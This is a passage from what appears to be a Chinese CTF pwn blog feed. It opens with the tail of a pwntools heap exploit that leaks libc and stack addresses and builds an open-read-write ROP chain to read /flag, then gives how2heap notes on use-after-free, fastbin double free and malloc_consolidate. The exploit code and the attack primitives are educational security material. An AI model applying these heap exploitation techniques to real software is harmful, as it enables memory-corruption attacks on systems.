class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x7f0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base= &quot;</span>+<span class="built_in">hex</span>(heap_base)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Name: &#x27;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1ebbe0</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_base= &quot;</span>+<span class="built_in">hex</span>(libc_base)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">open</span> = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts = libc_base + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">gadget = libc_base + <span class="number">0x157d8a</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000026b72</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000027529</span></span><br><span class="line">pop_rdx_r12 = libc_base + <span class="number">0x000000000011c371</span></span><br><span class="line">leave_ret = libc_base + <span class="number">0x000000000005aa48</span></span><br><span class="line">pop6 = libc_base + <span class="number">0x00026b69</span></span><br><span class="line">environ = libc_base + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;environ= &quot;</span>+<span class="built_in">hex</span>(environ)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x0000000000026b72 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000027529 : pop rsi ; ret </span></span><br><span class="line"><span class="string">0x000000000011c371 : pop rdx ; pop r12 ; ret</span></span><br><span class="line"><span class="string">0x000000000005aa48 : leave ; ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">1</span>,<span class="string">&#x27;\x00\x00\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">rename(<span class="number">6</span>,p64(environ-<span class="number">0x10</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please choose your child&#x27;s gender.\n1.Boy\n2.Girl:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s name:&quot;</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Description:&#x27;</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;stack_addr= &quot;</span>+<span class="built_in">hex</span>(stack_addr)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">rename(<span class="number">6</span>,p64(stack_addr-<span class="number">0x100</span>-<span class="number">0x10</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input index?&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please choose your child&#x27;s gender.\n1.Boy\n2.Girl:&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please input your child&#x27;s name:&quot;</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">orw = p64(pop_rdi)+p64(heap_base+<span class="number">0x6f0</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(<span class="built_in">open</span>)</span><br><span class="line">orw += p64(pop_rdi)+p64(<span class="number">4</span>)+p64(pop_rsi)+p64(heap_base+<span class="number">0x500</span>)+p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)*<span class="number">2</span>+p64(read)</span><br><span class="line">orw += p64(pop_rdi)+p64(heap_base+<span class="number">0x500</span>)+p64(puts)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">1</span>,<span class="string">&#x27;c7&#x27;</span>)</span><br><span class="line">edit_con(<span class="number">4</span>,<span class="string">&#x27;/flag\x00\x00&#x27;</span>)</span><br><span class="line">edit_con(<span class="number">2</span>,orw)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"><span class="comment">#chunk_ptr = 0x5555555580a0</span></span><br><span class="line">menu(<span class="number">6</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h2&gt;&lt;p&gt;因为ctf太卷了，现在比赛基本都会遇到沙盒，没办法，只能学一学，总结一下&lt;/p&gt;
&lt;h2 id=&quot;沙箱&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://billyotry.github.io/categories/CTF/"/>
    
    
      <category term="CTF/Pwn" scheme="https://billyotry.github.io/tags/CTF-Pwn/"/>
    
  </entry>
  
  <entry>
    <title>【how2heap】学习笔记</title>
    <link href="https://billyotry.github.io/2021/05/10/%E3%80%90how2heap%E3%80%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>https://billyotry.github.io/2021/05/10/%E3%80%90how2heap%E3%80%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2021-05-10T03:08:56.640Z</published>
    <updated>2021-05-20T04:44:29.277Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/shellphish/how2heap.git</span><br><span class="line">cd how2heap</span><br><span class="line">make</span><br></pre></td></tr></table></figure><blockquote><p>largebin、unsorted bin为先进先出，tcache、fastbin，small bin为先进后出</p></blockquote><h1 id="0x01-first-fit"><a href="#0x01-first-fit" class="headerlink" title="0x01 first-fit"></a>0x01 first-fit</h1><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>这个文件不是攻击demo，这个对glibc的一个机制(first-fit)的一个说明，并且这个机制常用在UAF中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 分配两个缓冲区，不一定是fastbin，可以比较大的</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 2 buffers. They can be large, don&#x27;t have to be fastbin.\n&quot;</span>);</span><br><span class="line"><span class="keyword">char</span>* a = <span class="built_in">malloc</span>(<span class="number">0x512</span>);</span><br><span class="line"><span class="keyword">char</span>* b = <span class="built_in">malloc</span>(<span class="number">0x256</span>);</span><br><span class="line"><span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(0x512): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(0x256): %p\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;we could continue mallocing here...\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;now let&#x27;s put a string at a that we can read later \&quot;this is A!\&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(a, <span class="string">&quot;this is A!&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="comment">// 我们不需要在释放其他缓冲区，只要我们的分配小于0x512，就可以从刚刚free的内存中取</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We don&#x27;t need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\n&quot;</span>, a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, let&#x27;s allocate 0x500 bytes\n&quot;</span>);</span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(0x500): %p\n&quot;</span>, c);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;And put a different string here, \&quot;this is C!\&quot;\n&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(c, <span class="string">&quot;this is C!&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd allocation %p points to %s\n&quot;</span>, c, c);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;first allocation %p points to %s\n&quot;</span>, a, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we reuse the first allocation, it now holds the data from the third allocation.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="程序结果及调试"><a href="#程序结果及调试" class="headerlink" title="程序结果及调试"></a>程序结果及调试</h2><p>我们在源码的32行下一个断点，康康此时的结果</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508176426/0" alt="image-20210510113041298"></p><p>可以看到此时的a，c位于同一内存空间</p><p>现在我们执行完<code>strcpy(c,&quot;this is C!&quot;)</code>,再康康结果</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508185273/0" alt="image-20210510113219170"></p><p>此时更改c成功更改了a的内容</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>程序首先分配了两个chunk块：a(0x512)，b(0x256)</p><p>然后给A赋值后，释放A，之后分配c(0x500)</p><p>然后给C赋值为”this is C”,此时输出a,c的地址和内容</p><p>发现a块和c块内存地址相同,但a的内容改为了C,程序成功通过修改c来修改来a块</p><p>而这也可以通过修改a块来修改c块的内容,而这也是一个uaf漏洞(<strong>free后并未置0</strong>) :)</p><h1 id="0x02-fastbin-dup"><a href="#0x02-fastbin-dup" class="headerlink" title="0x02 fastbin_dup"></a>0x02 fastbin_dup</h1><h2 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 一个基于fastbin的double-free利用</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates a simple double-free attack with fastbins.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocating 3 buffers.\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the first one...\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果再free一次，程序就会crash，因为a是free链上最顶的chunk</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;If we free %p again, things will crash because %p is at the top of the free list.\n&quot;</span>, a, a);</span><br><span class="line"><span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 因此我们free b</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;So, instead, we&#x27;ll free %p.\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line">    <span class="comment">// 现在我们再free一次a</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can free %p again, since it&#x27;s not the head of the free list.\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"><span class="comment">// 现在我们的free链变成了 a-&gt;b-&gt;a</span></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we&#x27;ll get %p twice!\n&quot;</span>, a, b, a, a);</span><br><span class="line">a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;1st malloc(8): %p\n&quot;</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;2nd malloc(8): %p\n&quot;</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;3rd malloc(8): %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">assert(a == c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果及调试"><a href="#运行结果及调试" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>首先我们看下没free前的堆</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508228458/0" alt="image-20210510114157569"></p><p>一共三个堆块，a，b，c，然后我们free a</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508231494/0" alt="image-20210510114245279"></p><p>然后free b</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508233420/0" alt="image-20210510114313375"></p><p>然后再free a</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508244838/0" alt="image-20210510114604143"></p><p>可以看到此时已经构成了一个chunk环即a-&gt;b-&gt;a，此时我们就可以分配两次0x602000。</p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>程序先申请了三个chunk a，b，c</p><p>然后释放a，再释放b，再释放a</p><p>此时的free list为a-&gt;b-&gt;a</p><p>然后再malloc3次分配到了a,b,a的内存,此时我们就得到了两次a的内存,修改其中任意一个就会影响另一块,这也就是double free的攻击demo了，这其实也算是fastbin的一个特性了。</p><p>PS：这里为什么fastbin会成功呢</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</span></span><br><span class="line"><span class="comment">//fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Another simple check: make sure the top of the bin is not the</span></span><br><span class="line"><span class="comment">       record we are going to add (i.e., double free).  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以只要不是连续释放同一个堆块即可。</p><h1 id="0x03-fastbin-dup-consolidate"><a href="#0x03-fastbin-dup-consolidate" class="headerlink" title="0x03 fastbin_dup_consolidate"></a>0x03 fastbin_dup_consolidate</h1><h2 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">void</span>* p1 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="keyword">void</span>* p2 = <span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated two fastbins: p1=%p p2=%p\n&quot;</span>, p1, p2);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now free p1!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 分配一个large bin来触发malloc_consolidate</span></span><br><span class="line">  <span class="keyword">void</span>* p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Allocated large bin to trigger malloc_consolidate(): p3=%p\n&quot;</span>, p3);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;In malloc_consolidate(), p1 is moved to the unsorted bin.\n&quot;</span>);</span><br><span class="line">  <span class="comment">// 通过malloc_consolidate函数我们可以把free掉的p1移动到unsorted bin  </span></span><br><span class="line">  <span class="built_in">free</span>(p1);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Trigger the double free vulnerability!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We can pass the check in malloc() since p1 is not fast top.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now p1 is in unsorted bin and fast bin. So we&#x27;will get it twice: %p %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x40</span>), <span class="built_in">malloc</span>(<span class="number">0x40</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="运行结果及调试-1"><a href="#运行结果及调试-1" class="headerlink" title="运行结果及调试"></a>运行结果及调试</h2><p>我们首先看一下malloc两次后的结果</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508541457/0" alt="image-20210510131237934"></p><p>此时我们free p1</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508542876/0" alt="image-20210510131306643"></p><p>此时我们malloc一个0x400的的大chunk，这样就会触发<code>malloc_consolidate</code></p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508545731/0" alt="image-20210510131408943"></p><p>可以看到此时我们的p1就被放入到<code>small bin</code>中了</p><h3 id="问题：这个过程到底发生了什么呢"><a href="#问题：这个过程到底发生了什么呢" class="headerlink" title="问题：这个过程到底发生了什么呢"></a>问题：这个过程到底发生了什么呢</h3><p>我们现来康康<code>malloc_consolidate</code>函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">malloc_consolidate</span><span class="params">(mstate av)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  mfastbinptr*    fb;                 <span class="comment">/* current fastbin being consolidated */</span></span><br><span class="line">  mfastbinptr*    maxfb;              <span class="comment">/* last fastbin (for loop control) */</span></span><br><span class="line">  mchunkptr       p;                  <span class="comment">/* current chunk being consolidated */</span></span><br><span class="line">  mchunkptr       nextp;              <span class="comment">/* next chunk to consolidate */</span></span><br><span class="line">  mchunkptr       unsorted_bin;       <span class="comment">/* bin header */</span></span><br><span class="line">  mchunkptr       first_unsorted;     <span class="comment">/* chunk to link to */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* These have same use as in free() */</span></span><br><span class="line">  mchunkptr       nextchunk;</span><br><span class="line">  INTERNAL_SIZE_T size;</span><br><span class="line">  INTERNAL_SIZE_T nextsize;</span><br><span class="line">  INTERNAL_SIZE_T prevsize;</span><br><span class="line">  <span class="keyword">int</span>             nextinuse;</span><br><span class="line">  mchunkptr       bck;</span><br><span class="line">  mchunkptr       fwd;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If max_fast is 0, we know that av hasn&#x27;t</span></span><br><span class="line"><span class="comment">    yet been initialized, in which case do so below</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (get_max_fast () != <span class="number">0</span>) &#123;</span><br><span class="line">    clear_fastchunks(av);</span><br><span class="line"></span><br><span class="line">    unsorted_bin = unsorted_chunks(av);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      Remove each chunk from fast bin and consolidate it, placing it</span></span><br><span class="line"><span class="comment">      then in unsorted bin. Among other reasons for doing this,</span></span><br><span class="line"><span class="comment">      placing in unsorted bin avoids needing to calculate actual bins</span></span><br><span class="line"><span class="comment">      until malloc is sure that chunks aren&#x27;t immediately going to be</span></span><br><span class="line"><span class="comment">      reused anyway.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    maxfb = &amp;fastbin (av, NFASTBINS - <span class="number">1</span>);</span><br><span class="line">    fb = &amp;fastbin (av, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">      p = atomic_exchange_acq (fb, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="number">0</span>) &#123;</span><br><span class="line">   <span class="keyword">do</span> &#123;</span><br><span class="line">     check_inuse_chunk(av, p);</span><br><span class="line">     nextp = p-&gt;fd;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* Slightly streamlined version of consolidation code in free() */</span></span><br><span class="line">     size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class="line">     nextchunk = chunk_at_offset(p, size);</span><br><span class="line">     nextsize = chunksize(nextchunk);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">       prevsize = p-&gt;prev_size;</span><br><span class="line">       size += prevsize;</span><br><span class="line">       p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">       unlink(av, p, bck, fwd);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">       nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">         size += nextsize;</span><br><span class="line">         unlink(av, nextchunk, bck, fwd);</span><br><span class="line">       &#125; <span class="keyword">else</span></span><br><span class="line">         clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">       first_unsorted = unsorted_bin-&gt;fd;</span><br><span class="line">       unsorted_bin-&gt;fd = p;</span><br><span class="line">       first_unsorted-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class="line">         p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">         p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       set_head(p, size | PREV_INUSE);</span><br><span class="line">       p-&gt;bk = unsorted_bin;</span><br><span class="line">       p-&gt;fd = first_unsorted;</span><br><span class="line">       set_foot(p, size);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">else</span> &#123;</span><br><span class="line">       size += nextsize;</span><br><span class="line">       set_head(p, size | PREV_INUSE);</span><br><span class="line">       av-&gt;top = p;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">   &#125; <span class="keyword">while</span> ( (p = nextp) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (fb++ != maxfb);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    malloc_init_state(av);</span><br><span class="line">    check_malloc_state(av);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于这个函数流程做个简单的解释</p><p>先通过<code>get_max_fast</code>函数确定堆是否被初始化了，如果没有初始化堆然后退出函数</p><p>从fastbin中获取一个空闲chunk，并首先尝试向后合并，这里向后合并指的是向低地址合并</p><p>然后尝试向前合并，如果此时于<code>top_chunk</code>相邻，就合并到<code>top_chunk</code>中</p><p>如果不相邻就放入到unsorted bin中，然后继续取fastbin chunk直到fastbin list为空结束</p><p>本例中的触发代码：</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508588455/0" alt="image-20210510133037099"></p><p>这里有个疑惑就是，不是说好的放入unsorted bin中嘛，为什么会出现在small bin中，其实我们在分配largebin时，ptmalloc会首先遍历一下fastbin，将相邻的chunk进行合并，并链接到unsorted bin中，然后遍历unsorted bin中的chunk，如果unsorted bin中只有一个chunk，并且这个chunk在上次分配时被使用过，并且所需要分配的chunk大小属于small bins，并且chunk的大小大于等于所需分配的大小，这种情况下就算直接将该chunk进行切割，分配结束，否则将根据chunk的空间大小将其放入small bins或是largin bins中</p><p>这就是为什么不在unsorted bin而在small bin中的原因了</p><blockquote><p>如果连large bin中都没有合适的，那就只能从top chunk中分割出一部分了，如果连top chunk也不满足，那就会mmap或者brk一块内存增加top chunk的大小</p></blockquote><p>我们此时继续free p1</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13508752242/0" alt="image-20210510141428106"></p><p>我们可以看到他现在既在small bin中又在fast 